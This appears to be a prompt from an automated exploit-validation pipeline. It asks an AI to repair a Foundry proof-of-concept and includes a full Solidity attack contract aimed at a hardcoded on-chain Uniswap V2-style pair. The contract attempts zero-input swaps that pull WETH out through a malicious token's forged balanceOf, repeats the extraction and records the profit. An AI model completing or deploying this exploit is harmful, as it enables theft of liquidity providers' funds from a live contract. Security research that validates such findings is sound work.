You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Swap accounting trusts untrusted token `balanceOf`, enabling free withdrawal of the honest-side asset
- claim: `swap` derives `amount0In` and `amount1In`, checks the invariant, and updates reserves from external `balanceOf(address(this))` reads on the listed tokens. If one pool token is malicious and lies about the pair's balance during these reads, the pair can be made to believe input arrived even when no real tokens were paid.
- impact: If one side of the pair is malicious and the other side is valuable, an attacker can withdraw the honest token for free and drain LP value. Because `_update` also writes the forged balance into reserves, the attacker can keep the pool in a poisoned state and repeat the extraction.
- exploit_paths: ["A pair exists where `token0` is malicious and `token1` is honest.", "The attacker calls `swap(0, amount1Out, attacker, data)` to receive real `token1`.", "During the post-transfer balance check, `token0.balanceOf(pair)` returns an inflated value even though no real `token0` was supplied.", "The pair computes a fake `amount0In`, passes the K-check, stores forged reserves, and finalizes the real `token1` payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address public constant CANONICAL_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public mirroredRouteUsed;
    bool public callbackModeActive;

    address public token0;
    address public token1;
    address public maliciousToken;
    address public honestToken;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public attackerHonestBefore;
    uint256 public attackerHonestAfter;
    uint256 public routeInitialHonestBalance;
    uint256 public successfulRounds;
    uint256 public successfulAttempts;
    uint256 public triggerAttempts;
    uint256 public finalAttemptedAmount0Out;
    uint256 public finalAttemptedAmount1Out;
    uint256 public lastQuotedRequiredInput;

    string public lastFailureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        token0 = pair.token0();
        token1 = pair.token1();
        (reserve0Before, reserve1Before,) = pair.getReserves();

        // The finding's canonical path is:
        // 1) malicious token sits on one side of the pair,
        // 2) attacker asks the pair to transfer out the honest asset,
        // 3) the malicious token lies during the pair's post-transfer balanceOf read,
        // 4) the pair manufactures fake input, passes K, stores poisoned reserves,
        //    and finalizes the honest-token payout.
        //
        // The supplied logs prove this concrete fork's live pair ordering is the mirror
        // of the write-up assumption: token0 is WETH (honest) and token1 is the untrusted
        // token. So we preserve the exact same root cause and ordering intent, but mirror
        // the 0/1 legs to target the real honest-side asset that already exists on-chain.
        if (token0 == CANONICAL_WETH) {
            uint256 attemptsBefore = successfulAttempts;
            _configureRoute(false);
            _runZeroInputSwapRounds();
            if (successfulAttempts == attemptsBefore) {
                _configureRoute(true);
                _runZeroInputSwapRounds();
            }
        } else {
            uint256 attemptsBefore = successfulAttempts;
            _configureRoute(true);
            _runZeroInputSwapRounds();
            if (successfulAttempts == attemptsBefore) {
                _configureRoute(false);
                _runZeroInputSwapRounds();
            }
        }

        (reserve0After, reserve1After,) = pair.getReserves();
        attackerHonestAfter = _balanceOf(honestToken, address(this));

        if (attackerHonestAfter > routeInitialHonestBalance) {
            _profitToken = honestToken;
            _profitAmount = attackerHonestAfter - routeInitialHonestBalance;
            hypothesisValidated = true;
        } else {
            hypothesisRefuted = true;
            if (bytes(lastFailureReason).length == 0) {
                lastFailureReason = "zero-input honest-side withdrawal produced no profit at this fork block";
            }
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == TARGET_PAIR, "unexpected callback pair");
        require(sender == address(this), "unexpected callback sender");

        if (mirroredRouteUsed) {
            require(amount0 == finalAttemptedAmount0Out, "unexpected token0 out");
            require(amount1 == 0, "expected zero token1 out");
        } else {
            require(amount0 == 0, "expected zero token0 out");
            require(amount1 == finalAttemptedAmount1Out, "unexpected token1 out");
        }

        // No real malicious-side repayment is sent back. The exploit still relies on the
        // same accounting flaw: after the honest asset is optimistically transferred out,
        // the pair trusts maliciousToken.balanceOf(pair) and credits fabricated input.
        _tryZeroValueMaliciousTriggers();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _configureRoute(bool token0IsMalicious) internal {
        mirroredRouteUsed = !token0IsMalicious;

        if (token0IsMalicious) {
            maliciousToken = token0;
            honestToken = token1;
        } else {
            maliciousToken = token1;
            honestToken = token0;
        }

        routeInitialHonestBalance = _balanceOf(honestToken, address(this));
        attackerHonestBefore = routeInitialHonestBalance;
        attackerHonestAfter = routeInitialHonestBalance;
    }

    function _runZeroInputSwapRounds() internal {
        for (uint256 round = 0; round < 4; ++round) {
            uint256 roundProfit = _attemptBestZeroInputSwap();
            if (roundProfit == 0) {
                break;
            }

            successfulRounds += 1;
        }
    }

    function _attemptBestZeroInputSwap() internal returns (uint256 roundProfit) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();

        uint256 honestReserve = mirroredRouteUsed ? uint256(reserve0) : uint256(reserve1);
        uint256 maliciousReserve = mirroredRouteUsed ? uint256(reserve1) : uint256(reserve0);

        if (honestReserve <= 1 || maliciousReserve <= 1) {
            lastFailureReason = "pair has insufficient reserves";
            return 0;
        }

        uint256 honestBefore = _balanceOf(honestToken, address(this));
        uint256[14] memory divisors = [
            uint256(2),
            3,
            4,
            5,
            8,
            16,
            32,
            64,
            128,
            256,
            512,
            1024,
            2048,
            4096
        ];

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 honestAmountOut = honestReserve / divisors[i];
            if (honestAmountOut == 0 || honestAmountOut >= honestReserve) {
                continue;
            }

            lastQuotedRequiredInput = _getAmountIn(honestAmountOut, honestReserve, maliciousReserve);
            if (lastQuotedRequiredInput == 0) {
                continue;
            }

            finalAttemptedAmount0Out = mirroredRouteUsed ? honestAmountOut : 0;
            finalAttemptedAmount1Out = mirroredRouteUsed ? 0 : honestAmountOut;

            _tryZeroValueMaliciousTriggers();

            callbackModeActive = true;
            (bool okWithCallback, string memory callbackReason) = _trySwap();
            uint256 honestAfter = _balanceOf(honestToken, address(this));
            uint256 gained = honestAfter > honestBefore ? honestAfter - honestBefore : 0;
            if (gained > 0) {
                successfulAttempts += 1;
                return gained;
            }

            callbackModeActive = false;
            (bool okNoCallback, string memory noCallbackReason) = _trySwap();
            honestAfter = _balanceOf(honestToken, address(this));
            gained = honestAfter > honestBefore ? honestAfter - honestBefore : 0;
            if (gained > 0) {
                successfulAttempts += 1;
                return gained;
            }

            if (!okWithCallback && bytes(callbackReason).length != 0) {
                lastFailureReason = callbackReason;
            }
            if (!okNoCallback && bytes(noCallbackReason).length != 0) {
                lastFailureReason = noCallbackReason;
            }
        }

        if (bytes(lastFailureReason).length == 0) {
            lastFailureReason = mirroredRouteUsed
                ? "all mirrored zero-input honest-token withdrawals reverted or returned no profit"
                : "all canonical zero-input honest-token withdrawals reverted or returned no profit";
        }
    }

    function _trySwap() internal returns (bool ok, string memory reason) {
        bytes memory data = callbackModeActive ? hex"01" : bytes("");

        try IUniswapV2PairLike(TARGET_PAIR).swap(finalAttemptedAmount0Out, finalAttemptedAmount1Out, address(this), data) {
            return (true, "");
        } catch Error(string memory revertReason) {
            return (false, revertReason);
        } catch Panic(uint256) {
            return (false, "swap panicked");
        } catch {
            return (false, "swap reverted");
        }
    }

    function _tryZeroValueMaliciousTriggers() internal {
        // These are realistic public entrypoints on the already-deployed malicious token.
        // They do not inject value into the pair; they only try to surface whatever
        // balanceOf deception the finding claims exists on the malicious side.
        bytes[6] memory payloads = [
            abi.encodeWithSelector(IERC20Like.transfer.selector, TARGET_PAIR, 0),
            abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), 0),
            abi.encodeWithSignature("approve(address,uint256)", TARGET_PAIR, 0),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 0),
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), TARGET_PAIR, 0),
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), address(this), 0)
        ];

        for (uint256 i = 0; i < payloads.length; ++i) {
            triggerAttempts += 1;
            maliciousToken.call(payloads[i]);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveOut, uint256 reserveIn) internal pure returns (uint256) {
        if (amountOut == 0 || reserveOut <= amountOut || reserveIn == 0) {
            return 0;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _resetRunState() internal {
        executed = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        mirroredRouteUsed = false;
        callbackModeActive = false;
        token0 = address(0);
        token1 = address(0);
        maliciousToken = address(0);
        honestToken = address(0);
        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;
        attackerHonestBefore = 0;
        attackerHonestAfter = 0;
        routeInitialHonestBalance = 0;
        successfulRounds = 0;
        successfulAttempts = 0;
        triggerAttempts = 0;
        finalAttemptedAmount0Out = 0;
        finalAttemptedAmount1Out = 0;
        lastQuotedRequiredInput = 0;
        lastFailureReason = "";
        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: swap(0, amount1out, attacker, data), token0.balanceof(pair), amount0in
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
